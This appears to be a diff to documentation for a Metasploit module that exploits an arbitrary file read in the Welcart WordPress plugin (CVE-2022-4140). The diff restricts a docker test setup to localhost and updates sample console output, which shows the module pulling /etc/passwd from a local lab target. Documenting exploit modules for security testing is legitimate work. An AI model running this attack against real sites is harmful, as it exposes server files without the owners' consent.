@@ -38,7 +38,7 @@ services:
     depends_on:
       - db
     ports:
-      - "8080:80"
+      - "127.0.0.1:8080:80"
     environment:
       WORDPRESS_DB_HOST: db:3306
       WORDPRESS_DB_USER: bala
@@ -99,14 +99,16 @@ The module should:
 
 ## Scenarios
 ```
+msf auxiliary(gather/wp_welcart_fileread_cve_2022_4140) > check
+[+] 127.0.0.1:8080 - The target appears to be vulnerable.
 msf auxiliary(gather/wp_welcart_fileread_cve_2022_4140) > run
 [*] Running module against 127.0.0.1
-[+] Welcart e-Commerce plugin found: {:version=>"2.8.4"}
-[+] The target is vulnerable
-[*] File saved to: /home/kali/.msf4/loot/20260908071206_default_127.0.0.1_welcart.http_325933.bin
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable.
+[*] File saved to: /home/kali/.msf4/loot/20261014121930_default_127.0.0.1_welcart.http_526038.bin
 [*] Auxiliary module execution completed
-msf auxiliary(gather/wp_welcart_fileread_cve_2022_4140) > cat /home/kali/.msf4/loot/20260908071206_default_127.0.0.1_welcart.http_325933.bin
-[*] exec: cat /home/kali/.msf4/loot/20260908071206_default_127.0.0.1_welcart.http_325933.bin
+msf auxiliary(gather/wp_welcart_fileread_cve_2022_4140) > cat /home/kali/.msf4/loot/20261014121930_default_127.0.0.1_welcart.http_526038.bin
+[*] exec: cat /home/kali/.msf4/loot/20261014121930_default_127.0.0.1_welcart.http_526038.bin
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
